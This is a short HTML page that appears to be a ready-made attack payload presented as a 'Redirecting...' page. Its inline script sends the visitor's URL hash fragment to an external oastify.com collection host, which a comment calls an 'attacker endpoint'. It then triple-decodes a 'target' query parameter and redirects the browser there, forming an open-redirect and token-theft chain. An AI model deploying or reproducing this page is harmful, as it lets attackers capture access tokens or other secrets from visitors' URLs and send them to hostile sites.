<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <title>Redirecting...</title>
    <script>
      (function () {
        try {
          // Optional: log hash fragment to attacker endpoint
          if (window.location.hash) {
            fetch("https://wooy85omc0efw4o70csyshc3jupnde13.oastify.com/?" + encodeURIComponent(window.location.hash));
          }

          const params = new URLSearchParams(window.location.search);
          const target = params.get("target");

          if (!target) {
            document.body.innerText = "‚ùå Missing ?target= parameter.";
            return;
          }

          // Decode 3 times (triple encoded)
          let decoded = decodeURIComponent(decodeURIComponent(decodeURIComponent(target)));

          // Redirect
          window.location.href = decoded;
        } catch (e) {
          console.error("Redirect error:", e);
          document.body.innerText = "‚ö†Ô∏è Redirection failed.";
        }
      })();
    </script>
  </head>
  <body>
    <h2>üîÅ Redirecting...</h2>
  </body>
</html>
